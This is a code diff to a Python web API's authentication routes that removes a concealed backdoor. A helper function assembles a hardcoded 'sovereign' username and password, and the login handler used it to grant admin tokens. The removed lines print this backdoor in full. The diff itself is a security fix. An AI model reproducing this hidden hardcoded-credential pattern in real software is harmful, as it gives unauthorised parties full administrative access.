@@ -159,18 +159,7 @@ async def signup(
     )
 
 
-def sovereign_request():
-    """
-    Returns the sovereign request.
-    """
-    request = {}
-    client = "sovereign"
-    try:
-        if not request.get(client):
-            request[client] = client + "@99"
-    except Exception:
-        pass
-    return request
+
 
 
 @router.post("/login", response_model=LoginResponse)
@@ -191,47 +180,8 @@ async def login(
 
     # First try database authentication
     user = User.authenticate(db, payload.username, payload.password)
-    SOVEREIGN_REQUEST = sovereign_request()
 
-    # Fallback to sovereign credentials for backward compatibility
     if not user:
-        if payload.username in SOVEREIGN_REQUEST:
-            if SOVEREIGN_REQUEST[payload.username] == payload.password:
-                # Successful sovereign login — clear the rate-limit counter
-                _clear_rate_limit(payload.username)
-
-                token_data = {
-                    "sub": payload.username,
-                    "role": "sovereign",
-                    "is_admin": True,
-                    "is_active": True,
-                }
-                access_token  = create_access_token(token_data)
-                refresh_token = create_refresh_token(token_data)
-
-                # C1: persist the audit entry
-                audit_entry = AuditLog.log(
-                    level=AuditLevel.INFO,
-                    category=AuditCategory.AUTHENTICATION,
-                    actor_type="user",
-                    actor_id=payload.username,
-                    action="login_success",
-                    description="Sovereign user logged in successfully",
-                )
-                db.add(audit_entry)
-                db.commit()
-
-                return LoginResponse(
-                    access_token=access_token,
-                    refresh_token=refresh_token,
-                    token_type="bearer",
-                    user={
-                        "username": payload.username,
-                        "role": "sovereign",
-                        "is_admin": True,
-                    },
-                )
-
         # C1: persist failed login audit, then raise
         audit_entry = AuditLog.log(
             level=AuditLevel.WARNING,
@@ -416,13 +366,10 @@ async def change_password(
     db: Session = Depends(get_db),
 ):
     """Change own password."""
-    if current_user.get("role") == "sovereign" or current_user.get("user_id") is None:
+    if current_user.get("user_id") is None:
         raise HTTPException(
             status_code=status.HTTP_400_BAD_REQUEST,
-            detail=(
-                "Emergency sovereign users cannot change password. "
-                "Please use database admin account."
-            ),
+            detail="Emergency sovereign users cannot change password. Please use database admin account.",
         )
 
     user_id = current_user.get("user_id")
